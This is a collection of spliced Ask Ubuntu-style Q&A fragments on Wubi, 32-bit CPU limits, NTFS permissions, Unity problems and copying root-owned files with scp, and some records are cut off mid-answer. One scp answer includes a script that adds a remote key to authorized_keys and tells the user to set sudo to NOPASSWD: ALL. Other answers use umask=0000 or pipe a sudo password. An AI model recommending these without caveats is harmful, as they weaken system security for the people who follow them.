According to this article that I found, Wubi \"has the side-effect of allowing you to run Linux apps within a Windows environment.\" I found this statement to be very intriguing: Is it actually possible to run Linux applications on Windows (without rebooting) using Wubi? I know that there are other solutions (such as coLinux), but running Linux applications in Windows using Wubi might be useful as well.\n\nA: No, not really. Wubi is different. It lets you install Ubuntu to an image and boot it natively. When you get the Windows loader, it lets you choose to boot a GRUB within a loopback device. TO run Linux programs on Windows, where they appear as separate Windows, you'll want an older version of Ubuntu(before Unity), or a non-unity distro like Xubuntu, Kubuntu, or Lubuntu, and Virtualbox. When you use Unity, seamless mode doesn't make windows separate.\n\nA: I think in the past when you installed Wubi it also installs Virtualbox and sets it up to use the same image, so that may be what the article refers to. I don't know if that is still the case, though. It's not really running \"in windows\", though if you have a non-Unity-based window manager and Virtualbox seamless mode it can certainly appear similar.\nThe main difference between Wubi and a normal installation is that it installs the linux filesystem to a file within your NTFS partition, rather than making a separate partition. However, you're not \"running windows\" in any meaningful sense when you boot normally to a Wubi installation. The kernel loads normally, and loads a ntfs driver from an initrd, and then finds the Wubi image and mounts it as the root filesystem (see pivot_root for how it can mount a root filesystem while it is already running)\nSee also What's the difference between Wubi and a regular installation?\n\nA: Technically you are not running Wubi inside of Windows, what Wubi does is install Ubuntu as a \"virtual drive\" and creates a \"loopback\" when you boot, this allows you to choose between Windows, or Ubuntu.\nSo in short your answer is no.\n\nA: Wubi allows you to install Linux from Windows. Afaik even inside a Windows partition without repartitioning (by using an image file). As far as I understand this is not what you are looking for.\nBut... you will be intrigued by Cygwin. Kind of the opposite of Wine, but working much better. Cygwin provides Linux API calls in windows and can run almost all native Linux applications (except maybe some very system specific tasks. Cygwin even provides a X-Server and lets you ssh -X to a *nix host to see X11 application windows over network.\n", "Q: Why does Ubuntu 12.10 only see 8 cores? In our lab we just bought a new machine with two 8-cores Intel(R) Xeon(R) CPU E5-2660 0 @ 2.20GHz processors which also support Hyper-Threading. \nI would expect Ubuntu to see 32 processing units, however it only detects 8 of them (the equivalent of just one processor with Hyper-Threading disabled). The bios correctly reports a total of 32 processing units. I am using the i386 version of Ubuntu 12.10 desktop. \nAny idea about how to solve this?\n\nA: On 32-bit, it's how the kernel is hardwired when compiled. It includes a line in /usr/src/linux-source-3.2.0/debian.master/config/i386/config.common.i386 that reads:\nCONFIG_NR_CPUS=8\n\nwhich sets CPUs to 8. If you ensure you use the 64-bit (AMD64) CD, you will get up to 256 cores. If you use 32-bit(i386) version without hyper-threading, you get 8 working cores out of the total of 16, which is still a waste. So, I guess you need to use the 64-bit version if at all possible. You can try to file a bug complaining about the low limit.\nI may file one later, but I'll post if I will.\n", "Q: Is there a way to get 2x3 workspaces in gnome 3.6 All the extensions and workarounds I can find don't seem to work in gnome 3.6.

That changes the group and permissions on the device rather than the rule. \nHow do I make the rule only apply to a particular group of users? \n\nA: If you wan't to hide all files inside a specific folder remove the execute permissions on that folder for the user or group you want. That disallows them from entering the folder.\nchmod g-x /path/to/folder\n\nThe g stands for 'group'.

I am testing some android based mobiles in Linux machine. The automation script uses the device ID under /dev/bus/usb/001/\"053\" it will be always under bus 001 only. But the dev will be random like if I insert one mobile then the dev ID will be 053, if remove and insert it again then the dev ID will be 054.\nThe problem is, when some tests runs on the device and if device gets rebooted then new dev ID is showing for the rebooted one and my scripts failing due to new dev ID. \nIs there any way to force USB devices to use same dev ID instead of new one, so that there will be no issues to my tests even after device reboots?\n\nA: It doesn't seem possible to force a particular ID.

I have a Dell Mini 10 with a corrupt Windows 7 OS (Bootmgr missing).\nHow can I install Ubuntu as it does not have an optical disk drive? Can I install from an USB stick?\n\nA: Yes, you can install from USB stick. Ubuntu installation will overwrite the bootmgr and make your computer just as fine (even better probably, since it's Ubuntu ;)) - given that this is the only problem with it.\nAnyways. There are many ways to get Ubuntu on a USB stick, many of which are easy to find with google - or on the Ubuntu site it self.\nI assume you are going to do this from another machine, probably a Windows machine? There is a great guide on the Ubuntu website explaining this: http://www.ubuntu.com/download/help/create-a-usb-stick-on-windows\n\nTo run Ubuntu from a USB stick, the first thing you need to do is insert a USB stick \nwith at least 2GB of free space into your PC.\n\nThe easiest way to put Ubuntu onto your stick is to use \nthe USB installer provided at pendrivelinux.com. \nYou’ll need to download and install and follow the instructions.\n\nIt is really as easy as that. When you are done making your USB stick, you just have to boot from the USB stick and follow the installation of Ubuntu.\nIf you are not on Windows, the same link has information about doing this from Ubuntu or Mac OS too.\n\nA: Yes, you can install it from an USB stick. Read here. If you're on windows:\nDownload and use Linux Live Usb Creator.\nOnce you have usb-creator.exe, run it and follow the same steps as described for Linux (point it at your .iso file or your Ubuntu CD-ROM, point it at your USB flash drive, make sure you have the right device selected, then \"Make Startup Disk\").\nAs Ubuntu doesn't use Windows bootmgr (it uses GRUB boot loader) you won't have any problems to boot Ubuntu, but maybe you will have to fix Window's bootmgr for booting into it.\n", "Q: How to create a new blank file in Nautilus 3.6 and above? I used to create new blank files in Nautilus (Files) using the right click context menu. It really saved me a lot of time. Since Nautilus 3.6, there is no such entry.\nIs there a way to create a new blank file in Nautilus 3.6 and above?\n\nA: I can't really find this option in 3.6 either, but there are command line tools that can help you out (but it depends on what you are actually trying to accomplish here).\nIn a Terminal (CTRL+ALT+T) you can write the command:\n touch filename.ext \nThis will create an empty file called filename.ext - you can call it whatever you want, with whatever extension (or no extension) you feel like. \n\nA: This guy saved me.

This feature still exists.\nThe solution is to create a blank file named for instance new inside the ~/Templates/ folder of your home directory.\n\n→ On non-English installations, the templates directory might have another name. One can find the actual directory with xdg-user-dir TEMPLATES.\n\n\n\nIf you're still facing the problem, Check the file in ~/.config/user-dirs.dirs if XDG_TEMPLATES_DIR variable is set correctly.

Please uninstall that before continuing At first I was downloading Ubuntu 12.10 using Windows Installer, but I cancelled it after just 2-3 minutes and downloaded 32-Bit ISO (ubuntu-12.10-desktop-i386).\nThen I created bootable USB Stick (new HP 210 v210 w) using Pendrivelinux\n(Universal-USB-Installer-1.9.1.4).\n\n\n*\n\n*I Formatted D Drive.

The former needs a workaround, and the last time I tried the latter, it tried to copy the entire USB partition as the ISO and that can be 2-16GB.\nIf you see:\nTry hd(0,0): NTFS5 : No wubildr \nTry hd(0,1): NTFS5 :\n\nThis means that wubi can read the first partition hd(0,0) (= /dev/sda1) and there is no wubildr there (which is normal if it's a recovery or boot partition). And it means that wubi is hanging when attempting to read the second partition hd(0,1) (= /dev/sda2). I don't know why, but it does that sometimes - rarely. If I were you, I'd boot from that USB you have, mount /dev/sda2 and /dev/sda1 and copy /wubildr to it.\nsudo mkdir /mnt/sda2\nsudo mkdir /mnt/sda1\nsudo mount /dev/sda2 /mnt/sda2\nsudo mount /dev/sda1 /mnt/sda1\nsudo cp /mnt/sda2/wubildr /mnt/sda1/wubildr\nsudo umount /mnt/sda2\nsudo umount /mnt/sda1\nsudo rmdir /mnt/sda2\nsudo rmdir /mnt/sda1\n\nThat should get wubildr (grub2) going.\nIf you have a spare paritition (D:) then I would actually recommend just installing directly to it, rather than use Wubi. It's much better, if you can handle Ubuntu being in control of your boot process (make a windows repair cd before so you can replace the windows bootloader if you want to uninstall later). But if you have to use Wubi then you can use the above techniques.\n", "Q: How to 'chown' on an NTFS ( or FAT32 ) partition? I cannot copy films from NTFS partition on my computer (with Ubuntu) to ext2 hard drive installed in player \"Dune\". Please help.\n\nA: I suspect your NTFS partition gets automatically mounted at boot. If we were speaking about i.e. a USB disk you attach to your computer, the permissions would be set correctly when you click on the volume in your file manager.\nSo there is probably an entry in your /etc/fstab file which looks like this:\n\n...\nsomeWeirdId  /media/name  ntfs  auto,stuff,stuff,stuff  0  0\n\nchange this to:\n\n...\nsomeWeirdId  /media/name  ntfs  auto,stuff,stuff,stuff,uid=1000,gid=1000,umask=0000  0  0\n\nThis gives ownership of the mounted volume to the user with uid 1000, which would be the first user in your system. Enter id on a terminal to see what uid and gid you have.\nSetting umask to 0000 should grant all permissions to every user anyway.\n\nNTFS and FAT cannot store posix permissions, like they are used by Linux (actually i'am not sure about NTFS, but I wouldn't know how).\nHowever you can use the program fuse-posixovl to mount a directory (!) on any partition (regardless if posix permissions are suipported or not) to another directory (or the same directory if you feel like it). posixovl will create a file on the real filesystem storing the posix permissions you set in the other mountpoint. This way you get full posix functionality on any non-posix file system.\nTo be able to change file ownership, etc. you should run posixovl as root (via sudo).\nsudo mount.posixovl /directory/on/ntfs/partition /directory/where/i/use/chown\nAs I said source and target directories can theoretically be the same, but try it with different directorys first, just to be sure.\nThe permissions will not be effective unless posixovl is used. So you can't protect your data when you attach the disk to friends computer or something. The files will be accessible anyway.\n\nA: I came across this Q/As while looking for: How to change permissions in an NTFS partition?\nAnd while the Original Question title explain correctly and concisely my issue, it seems that it's body doesn't correspond to the the title, and it's a different (but maybe related issue), So, first, I'll answer the title question, then comment on the OQ body\n\nshort answer\nyou need to mount the NTFS partition, with the appropriate mount options (users,permissions)\ndetailed answer\nYou can change the permissions and ownership of files and folders stored in an NTFS partition, (but not in a FAT one). Because, as it's nicely explained in this answer NTFS is a POSIX-compatible filesystem.\nAlthough, it is usually unneeded¹ for copying/editing files in an NTFS partition from a linux one (in case of dual-boot)\n\n\n*\n\n*NTFS partition on read only? enable write/read\nBy default Windows system on laptops doesn't perform a full shutdown, when you shutdown the system. Which makes the partition accessible on read only mode.\nPerform a Full Shutdown of windows, by either:\n\n*\n\n*holding down the SHIFT ⇧ key on your keyboard and then click the “Shut down” option in the Start Menu.\n\n\n*or, type the following, in Windows Command Line (cf. Shutdown | Microsft doc)\nshutdown /s /f /t 0\n\nOr just disable Hibernate / Fast startup windows' \"features\" permanently, to make all eventual shutdown == full shutdown(cf this question for more info)\nThis, in most cases, is enough to make you able to access and edit all files in a windows partition.\nBut if you still need to \"chown the NTFS partition\" then\n\n\n\n*change NTFS partitions mount option, either by :\n\n\n*\n\n*editing /etc/fstab using:\n\nsudo -e /etc/fstab\n\n\n*\n\n*or graphically, using disk utility\nEither way, the options that you most have are: users,permissions, and you don't need to have nosuid option, since it's implied by users (cf. Bovine comment)\nso, the /etc/fstab entry for the NTFS partition should looks like:\n# <file system> <mount point>   <type>      <options>                           <dump>  <pass>\n\nFILE_SYS_UUID   /mnt/Win_D      ntfs-3g     users,permissions,x-gvfs-show,...   0       0\n\n\nNote: if you are using a very old Ubuntu, or a distro that doesn't use ntfs-3g for NTFS file by default, make sure to change file system type to ntfs-3g instead of ntfs or auto, otherwise they're the same (cf. this answer)\n\n\n\n*chown/chmod it as you like\n\nAbout the Original Question\nCopying files from a directory D_src to a D_dest requires read right only on D_src, and read/write rights on D_dest\nSo, in case you want just to copy some files from an NTFS D_src partition, that you are able to access on read only mode, to an ext partition D_dest. you don't need to change the former permissions. but looks into the latter\nSome additional info & a warning\nIn addition to the default windows setting on laptops, that make NTFS partitions read only, you may get a similar behavior in the case of  hanging updates. so make sure you don't have one.\nIt goes without saying, but I'll say it nevertheless:\nThe process described above will give you the power to edit the file\nsystem of a Windows or NTFS partition the same way as a linux one,\nwhich may be dangerous if you don't know what you're doing.

I've enabled a bunch of no-prefix shortcuts in tmux (like Alt-c for new window, Alt-n for next), which has made my life so much better. The problem was, my shortcuts didn't always work. Maybe every 5-10 presses, something would just swallow the keypress, and I'd have to do it again. Sometimes it would send input to the terminal, which was even worse.\nI worked this out for myself, but I wanted to post it as a question because I couldn't find anything when I was searching. Lots of people talk about the \"menu access key\" problem, but this is actually unrelated.\n\nA: The problem turned out to be Unity.

I have a HP Envy 17-3200.  It may be more relevant to say, I'm using an integrated intel graphics card.\nThis problem persists in both unity and in gnome shell.\n\nA: This problem (generally) doesn't arise if the slider in 'System Settings>Brightness and lock' is used.\nThis (generally) arises when the brightness control hotkeys are used because the acpi driver, intel driver and gnome power daemon (and possibly one more) all handle the hotkeys and pass them onto the next level -seems like stupid design really.\nFIX 1:\nAn easy fix is to let the intel driver do the job and disable the rest as follows.\n\n\n*\n\n*As root edit /etc/default/grub: sudo nano /etc/default/grub\n\n*Find the line containing GRUB_CMDLINE_LINUX_DEFAULT= and add the options acpi_backlight=vendor acpi_osi=Linux. For example, change GRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash\" to GRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash acpi_backlight=vendor acpi_osi=Linux\"\n\n*Save file by pressing Ctrl-O and then enter. Press Ctrl-X to exit.\n\n*Now, run sudo update-grub\n\n*Restart the computer. Now, brightness should increase in steps of one.\n\n\nNote: If you do this you will loose the brightness slider and the OSD notification for brightness change (as they are handled by gnome). In my opinion, however, these are not important. You can undo these changes by again editing /etc/default/grub to what it was, then running sudo update-grub and restarting.\nFIX 2:\nNot so easy fix: Let gnome handle the brightness controls.\nRefer to https://askubuntu.com/a/178003/111720. Stopping acpi driver from handling keys should work as it is given in that answer. But to take care of intel driver, you'll have to port the instructions for thinkpad_acpi module to intel (This may not even be possible).\nFIX 3:\nMore info:\nActually 256 (0-255) levels of brightness are available. To check that it works for you try sudo setpci -s '00:02.0' F4.B=xx where xx is a hex number. digits are 0,1,...9,a,b,c,d,e,f. Example: sudo setpci -s '00:02.0' F4.B=2b sets brightness to 2*16 + 11(b is eleven) = 43. 00 corresponds to absolute zero brightness (if you end up doing this, just use the hotkeys to regain brightness).\nI find this really useful when working in the dark or reading a book (The least brightness you can set with the slider is actually pretty high, and the jumps in brightness level are also larger - as you've already figured out the slider is not continuous).\nI've written a python script (remappable to shortcuts) which uses this to control brightness (increase and decrease, not just set) complete with OSD notification. If you're interested let me know (It may have to be edited to work in different hardware, I've not tested it in anything other my ACER ONE D270. So I may need some additional info).\n", "Q: How to integrate Pidgin on Ubuntu 12.10 I have just recently updated my system to Ubuntu 12.10 and I cannot integrate Pidgin with the toolbars any more!

I want to tweak it manually but I didn't manage to find it out under /usr/share/icons.\nIs there a general way to find out which icon a certain application is using?\n\nA: The icon is called system-devices-panel and there are indicating variants like system-devices-panel-alert. Their location is the status subfolder of your theme (or the fallback-themes) in /usr/share/icons.\nIn /home/$USER/.cache you'll find the file indicator-applet-complete.log which is the log file for indicator-applet. In this file I found the line \nDEBUG: Indicator-Session - indicator-session.c:425 setting icon to \"system-devices-panel\".\nI would suggest you to create your own theme.

Thanks very much!\n\nA: I had the same problem but none of the above worked for me. Uninstalling compizconfig-settings-manager also didn't work.\nIn the end I found the answer here, as I was seeing the same 'Fatal: glXQueryExtensionsString is NULL for screen 0' errors in a terminal when trying to start unity. I realised I was using a proprietary ATI display driver before I upgraded from 12.04 to 12.10. I issued the commands below in a terminal:\nsudo add-apt-repository ppa:makson96/fglrx \nsudo apt-get update\nsudo apt-get upgrade\nsudo apt-get install fglrx-legacy\n\nand then rebooted my PC. Unity then reappeared when I logged in.\nThere's an explanation here of why the upgrade fails in the first place. I was using an AMD Mobility Radeon HD 3650 graphics card (ATI RV635). Use:\nlspci | grep VGA\n\nto find out what graphics card you are using.\n\nA: There are know issues with restricted video drivers, compiz, and/or unity 3D (one or all or maybe something else too).  If the other answers that suggest reseting compiz and unity don't work, try running unity 2D. At the login screen, right click the Ubuntu circle thing to the right of your name, click Ubuntu 2D, and login as normal.\n\nA: Usually, some settings brought over from the previous version are incompatible with the current way of doing things. As of 12.10 you can no longer use 'unity --reset' to fix this, but there is a work-around.\nHave a look here : How do I reset my Unity configuration?\nMake sure you are following instructions for ubuntu 12.10, not the older instructions.\n\nA: The \"unity --reset\" may not be working on Ubuntu 12.10 but you could try the following:\nunity-reset\n\nIf that does not solve your problem you could try the following to reset your Unity:\nsudo add-apt-repository ppa:amith/ubuntutools\nsudo apt-get update\nsudo apt-get install unity-reset\n\nThen you can use the unity-reset and everything should be restored.\nIf that doesn't work check this site for more information:\nhttp://www.webupd8.org/2012/10/how-to-reset-compiz-and-unity-in-ubuntu.html\n\nA: I would like to report my trajectory and dealing with No Launcher.\n\n\n*\n\n*It started with X-server problems in 12.04. because I couldn't log\nin with both lightdm or gdm. I only could log in by terminal.\n\n*I decided to execute do-release-upgrade to upgrade to 12.10. \n\n*With the new release I found that I could only log in with gdm, but the Desktop appeared without launcher or top bar.\n\n*In this forum I discovered that the Launcher problem was related with some AMD drivers.\n\n*To find out what is my graphic card, I did : \nlspci | grep -i vga\n02:00.0 VGA compatible controller: \nAdvanced Micro Devices [AMD] \nnee ATI Manhattan [Mobility Radeon HD 5400 Series]\n\n*I also discovered that in a terminal, I can execute the command: unity and recover my launcher.\nIn the same terminal I had the following error:\nCompiz: Unity is not supported  by your hardware. Enabling software rendering instead (slow) \n\n*I installed Catalyst 12.6 Legacy driver, Now I have a permanent square in the right bottom corner, displaying: AMD Unsupported hardware.\n\n*From a terminal I execute again the command: unity and recover my launcher. I feel that with this driver the laptop is not slow and is working almost normal. I am surviving like this!\n\n\nA: My launcher started becoming hard to reveal, then was only enabled by the Super key, then after a restart was replaced with a black bar slightly to the right of where the launcher should be. I tried all the above methods to no avail.\nOn a hunch I created a new user and the launcher is working as it should be, but only in that user. I don't have a solution, but am guessing some evil file or device is the culprit.\n", "Q: Can I uninstall Seahorse from Ubuntu 12.10 without side effects? I find Ubuntu (12.10)'s Seahorse intrusive and annoying and I would like to remove it using Ubuntu Software Center.

I'm using 12.10, but this has been happening since 11.04 came out.\nTwo applications, Skype and JungleDisk, have little icons that sit in the system tray in the top right corner of the screen.  I have added them to the system-tray whitelist in dconf-editor, so they do show up, at least initially.\nThe problem is that both icons disappear sometimes.  This happens even when the applications are open with a visible window - the icon just disappears from the tray.  The apps still work, they send notifications, etc, but the icons are gone.  It's especially annoying with JungleDisk, because once the icon disappears, the only way to interact with the program is to kill it manually, then relaunch, and open the window before the icon disappears.\nHere's the strange thing: if I open the Dash, or hit Super-S to expose all of the workspaces, you can see the icons again.

I have both kinds of ISOs booting, using examples from a variety of places including https://help.ubuntu.com/community/Grub2/ISOBoot, and the standard install is working fine. The alternate install is not, however.\nIt boots, runs through the language and keyboard configuration questions, pops up a brief \"Detecting hardware\" dialog, and then reports:\nDetect and mount CD-ROM\n\nYour installation CD-ROM couldn't be mounted. This probably means\nthat the CD-ROM was not in the drive.

Nor may it be possible to pass on to that kernel a loopback root device as an argument. Actually, I have no idea what happens to that device once kernel + initrd are loaded and booted -- that would be VERY interesting to know.\nI remember having succeeded, though, in booting a kfreebsd install DVD using that feature. But at some point it hanged because of not being able to \"find the installation media\". So I had to go to the console, manually use losetup to loopback-mount the ISO and link it to /dev/dvd or something, for the install scripts to notice it, then go back to the installation \"wizard\" and tell him where the media was... \nAnd even this completely manual boot from the ISO was not always possible for the reasons mentioned above.\nThis is my view on the problem, but it may be incomplete and grub2 itself may have evolved.

For example, Alt+p doesn't start dmenu and instead of xmonad status bar with numbered workspaces, the usual ubuntu taskbar shows up. \nWhat's the correct way to use the linked configuration on ubuntu 12.04?\n\nA: When you pick GNOME with Xmonad, you're telling it to run in Gnome. I've never actually tried that myself, but I believe it's actually meant to keep some of the Gnome GUI around. If you want to get rid of that, you need to run xmonad without Gnome. The way I usually do it is by making an xmonad.desktop file in /usr/share/xsessions/ with the following contents:\n[Desktop Entry]\nEncoding=UTF-8\nName=XMonad\nComment=Lightweight tiling window manager\nExec=xmonad\nIcon=xmonad.png\nType=XSession\n\nThat allows you to pick xmonad from the login screen.\n", "Q: How do I copy files that need root access with scp? I have an Ubuntu server to which I am connecting using SSH.\nI need to upload files from my machine into /var/www/ on the server, the files in /var/www/ are owned by root.\nUsing PuTTY, after I log in, I have to type sudo su and my password first in order to be able to modify files in /var/www/.\nBut when I am copying files using WinSCP , I can't create create/modify files in /var/www/, because the user I'm connecting with does not have permissions on files in /var/www/ and I can't say sudo su as I do in case of an ssh session.\nDo you know how i could deal with this ?\nIf I was working on my local machine, I would call gksudo nautilus but in this case I only have terminal access to the machine.\n\nA: If you use the OpenSSH tools instead of PuTTY, you can accomplish this by initiating the scp file transfer on the server with sudo. Make sure you have an sshd daemon running on your local machine. With ssh -R you can give the server a way to contact your machine.\nOn your machine:\nssh -R 11111:localhost:22 REMOTE_USERNAME@SERVERNAME\n\nIn addition to logging you in on the server, this will forward every connection made on the server's port 11111 to your machine's port 22: the port your sshd is listening on.\nOn the server, start the file transfer like this:\ncd /var/www/\nsudo scp -P 11111 -r LOCAL_USERNAME@localhost:FOLDERNAME .\n\n\nA: Another method is to copy using tar + ssh instead of scp:\ntar -c -C ./my/local/dir \\\n  | ssh dimitris@myserver.com \"sudo tar -x --no-same-owner -C /var/www\"\n\n\nA: You can also use ansible to accomplish this.\nCopy to remote host using ansible's copy module:\nansible -i HOST, -b -m copy -a \"src=SRC_FILEPATH dest=DEST_FILEPATH\" all\n\nFetch from remote host using ansible's fetch module:\nansible -i HOST, -b -m fetch -a \"src=SRC_FILEPATH dest=DEST_FILEPATH flat=yes\" all\n\nNOTE:\n\n*\n\n*The comma in the -i HOST, syntax is not a typo.  It is the way to use ansible without needing an inventory file.\n\n*-b causes the actions on the server to be done as root. -b expands to --become, and the default --become-user is root, with the default --become-method being sudo.\n\n*flat=yes copies just the file, doesn't copy whole remote path leading to the file\n\n*Using wildcards in the file paths isn't supported by these ansible modules.\n\n*Copying a directory is supported by the copy module, but not by the fetch module.\n\nSpecific Invocation for this Question\nHere's an example that is specific and fully specified, assuming the directory on your local host containing the files to be distributed is sourcedir, and that the remote target's hostname is hostname:\ncd sourcedir && \\\nansible \\\n   --inventory-file hostname, \\ \n   --become \\\n   --become-method sudo \\\n   --become-user root \\\n   --module-name copy \\\n   --args \"src=. dest=/var/www/\" \\\n   all\n\nWith the concise invocation being:\ncd sourcedir && \\\nansible -i hostname, -b -m copy -a \"src=. dest=/var/www/\" all\n\nP.S., I realize that saying \"just install this fabulous tool\" is kind of a\ntone-deaf answer. But I've found ansible to be super useful for administering remote servers, so installing it will surely bring you other benefits beyond deploying files.\n\nA: Here's a modified version of Willie Wheeler's answer that transfers the file(s) via tar but also supports passing a password to sudo on the remote host.\n(stty -echo; read passwd; stty echo; echo $passwd; tar -cz foo.*) \\\n  | ssh remote_host \"sudo -S bash -c \\\"tar -C /var/www/ -xz; echo\\\"\"\n\nThe little bit of extra magic here is the -S option to sudo. From the sudo man page:\n\n-S, --stdin\n                   Write the prompt to the standard error and read the password from the standard input instead of using the terminal device.  The password must be followed by a newline character.\n\nNow we actually want the output of tar to be piped into ssh and that redirects the stdin of ssh to the stdout of tar, removing any way to pass the password into sudo from the interactive terminal. (We could use sudo's ASKPASS feature on the remote end but that is another story.) We can get the password into sudo though by capturing it in advance and prepending it to the tar output by performing those operations in a subshell and piping the output of the subshell into ssh. This also has the added advantage of not leaving an environment variable containing our password dangling in our interactive shell.\nYou'll notice I didn't execute 'read' with the -p option to print a prompt. This is because the password prompt from sudo is conveniently passed back to the stderr of our interactive shell via ssh. You might wonder \"how is sudo executing given it is running inside ssh to the right of our pipe?\" When we execute multiple commands and pipe the output of one into another, the parent shell (the interactive shell in this case) executes each command in the sequence immediately after executing the previous. As each command behind a pipe is executed the parent shell attaches (redirects) the stdout of the left-hand side to the stdin of the right-hand side. Output then becomes input as it passes through processes. We can see this in action by executing the entire command and backgrounding the process group (Ctrl-z) before typing our password, and then viewing the process tree.\n$ (stty -echo; read passwd; stty echo; echo $passwd; tar -cz foo.*) | ssh \nremote_host \"sudo -S bash -c \\\"tar -C /var/www/ -xz; echo\\\"\"\n[sudo] password for bruce: \n[1]+  Stopped                 ( stty -echo; read passwd; stty echo; echo \n$passwd; tar -cz foo.* ) | ssh remote_host \"sudo -S bash -c \\\"tar -C \n/var/www/ -xz; echo\\\"\"\n\n$ pstree -lap $$\nbash,7168\n  ├─bash,7969\n  ├─pstree,7972 -lap 7168\n  └─ssh,7970 remote_host sudo -S bash -c \"tar -C /var/www/ -xz; echo\"`\n\nOur interactive shell is PID 7168, our subshell is PID 7969 and our ssh process is PID 7970.\nThe only drawback is that read will accept input before sudo has time to send back it's prompt. On a fast connection and fast remote host you won't notice this but you might if either is slow. Any delay will not affect the ability to enter the prompt; it just might appear after you have started typing.\nNote I simply added a host file entry for \"remote_Host\" to my local machine for the demo.\n\nA: May be the best way is to use rsync (Cygwin/cwRsync in Windows) over SSH?\nFor example, to upload files with owner www-data:\nrsync -a --rsync-path=\"sudo -u www-data rsync\" path_to_local_data/ login@srv01.example.com:/var/www\n\nIn your case, if you need root privileges, command will be like this:\nrsync -a --rsync-path=\"sudo rsync\" path_to_local_data/ login@srv01.example.com:/var/www\n\nSee: scp to remote server with sudo.\n\nA: You're right, there is no sudo when working with scp. A workaround is to use scp to upload files to a directory where your user has permissions to create files, then log in via ssh and use sudo to move/copy files to their final destination.\nscp -r folder/ user@server.tld:/some/folder/you/dont/need/sudo\nssh user@server.tld\n $ sudo mv /some/folder /some/folder/requiring/perms \n# YOU MAY NEED TO CHANGE THE OWNER like:\n# sudo chown -R user:user folder\n\nAnother solution would be to change permissions/ownership of the directories you uploading the files to, so your non-privileged user is able to write to those directories.\nGenerally, working in the root account should be an exception, not a rule - the way you phrasing your question makes me think maybe you're abusing it a bit, which in turn leads to problems with permissions - under normal circumstances you don't need super-admin privileges to access your own files.\nTechnically, you can configure Ubuntu to allow remote login directly as root, but this feature is disabled for a reason, so I would strongly advice you against doing that.\n\nA: Quick way\nFrom server to local machine:\nssh user@server \"sudo cat /etc/dir/file\" > /home/user/file\n\nFrom local machine to server:\ncat /home/user/file | ssh user@server \"sudo tee -a /etc/dir/file\"\n\n\nA: When you run sudo su, any files you create will be owned by root, but it is not possible by default to directly log in as root with ssh or scp.  It is also not possible to use sudo with scp, so the files are not usable.  Fix this by claiming ownership over your files:\nAssuming your user name was dimitri, you could use this command.\nsudo chown -R dimitri:dimitri /home/dimitri\n\nFrom then on, as mentioned in other answers, the \"Ubuntu\" way is to use sudo, and not root logins.  It is a useful paradigm, with great security advantages.\n\nA: You may use script I've written being inspired by this topic: \ntouch /tmp/justtest && scpassudo /tmp/justtest remoteuser@ssh.superserver.com:/tmp/\n\nbut this requires some crazy stuff (which is btw. automatically done by script)\n\n\n*\n\n*server which file is being sent to will no longer ask for password while establishing ssh connection to source computer\n\n*due to necessarility of lack of sudo prompt on the server, sudo will no longer ask for password on remote machine, for user\n\n\nHere goes the script: \ninterface=wlan0\nif [[ $# -ge 3 ]]; then interface=$3; fi\nthisIP=$(ifconfig | grep $interface -b1 | tail -n1 | egrep -o '[0-9.]{4,}' -m1 | head -n 1)\nthisUser=$(whoami)\nlocalFilePath=/tmp/justfortest\ndestIP=192.168.0.2\ndestUser=silesia\n#dest \n#destFolderOnRemoteMachine=/opt/glassfish/glassfish/\n#destFolderOnRemoteMachine=/tmp/\n\nif [[ $# -eq 0 ]]; then \necho -e \"Send file to remote server to locatoin where root permision is needed.\\n\\tusage: $0 local_filename [username@](ip|host):(remote_folder/|remote_filename) [optionalInterface=wlan0]\"\necho -e \"Example: \\n\\ttouch /tmp/justtest &&\\n\\t $0 /tmp/justtest remoteuser@ssh.superserver.com:/tmp/ \"\nexit 1\nfi\n\nlocalFilePath=$1\n\ntest -e $localFilePath \n\ndestString=$2\nusernameAndHost=$(echo $destString | cut -f1 -d':')\n\nif [[ \"$usernameAndHost\" == *\"@\"* ]]; then\ndestUser=$(echo $usernameAndHost | cut -f1 -d'@')\ndestIP=$(echo $usernameAndHost | cut -f2 -d'@')\nelse\ndestIP=$usernameAndHost\ndestUser=$thisUser\nfi\n\ndestFolderOnRemoteMachine=$(echo $destString | cut -f2 -d':')\n\nset -e #stop script if there is even single error\n\necho 'First step: we need to be able to execute scp without any user interaction'\necho 'generating public key on machine, which will receive file'\nssh $destUser@$destIP 'test -e ~/.ssh/id_rsa.pub -a -e ~/.ssh/id_rsa || ssh-keygen -t rsa'\necho 'Done'\n\necho 'Second step: download public key from remote machine to this machine so this machine allows remote machine (this one receiveing file) to login without asking for password'\n\nkey=$(ssh $destUser@$destIP 'cat ~/.ssh/id_rsa.pub')\nif ! grep \"$key\" ~/.ssh/authorized_keys; then\necho $key >> ~/.ssh/authorized_keys\necho 'Added key to authorized hosts'\nelse\necho \"Key already exists in authorized keys\"\nfi\n\necho \"We will want to execute sudo command remotely, which means turning off asking for password\"\necho 'This can be done by this tutorial http://stackoverflow.com/a/10310407/781312'\necho 'This you have to do manually: '\necho -e \"execute in new terminal: \\n\\tssh $destUser:$destIP\\nPress enter when ready\"\nread \necho 'run there sudo visudo'\nread\necho 'change '\necho '    %sudo   ALL=(ALL:ALL) ALL'\necho 'to'\necho '    %sudo   ALL=(ALL:ALL) NOPASSWD: ALL'\necho \"After this step you will be done.\"\nread\n\nlistOfFiles=$(ssh $destUser@$destIP \"sudo ls -a\")\n\nif [[ \"$listOfFiles\" != \"\" ]]; then \necho \"Sending by executing command, in fact, receiving, file on remote machine\"\necho 'Note that this command (due to \" instead of '', see man bash | less -p''quotes'') is filled with values from local machine'\necho -e \"Executing \\n\\t\"\"identy=~/.ssh/id_rsa; sudo scp -i \\$identy $(whoami)@$thisIP:$(readlink -f $localFilePath) $destFolderOnRemoteMachine\"\" \\non remote machine\"\nssh $destUser@$destIP \"identy=~/.ssh/id_rsa; sudo scp -i \\$identy $(whoami)@$thisIP:$(readlink -f $localFilePath) $destFolderOnRemoteMachine\"\nssh $destUser@$destIP \"ls ${destFolderOnRemoteMachine%\\\\\\\\n}/$(basename $localFilePath)\"\nif [[ ! \"$?\" -eq 0 ]]; then echo \"errror in validating\"; else echo -e \"SUCCESS!

